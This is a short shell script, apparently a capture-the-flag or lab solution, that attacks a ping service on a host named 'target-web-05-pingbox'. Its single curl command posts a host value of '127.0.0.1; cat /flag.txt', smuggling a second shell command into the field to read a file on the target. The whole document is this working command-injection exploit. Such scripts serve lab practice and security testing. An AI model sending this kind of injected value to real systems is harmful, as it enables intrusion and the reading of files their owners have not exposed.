TARGET=${1:-target-web-05-pingbox}
PORT=${2:-3000}
curl -s "http://$TARGET:$PORT/ping" --data-urlencode 'host=127.0.0.1; cat /flag.txt'
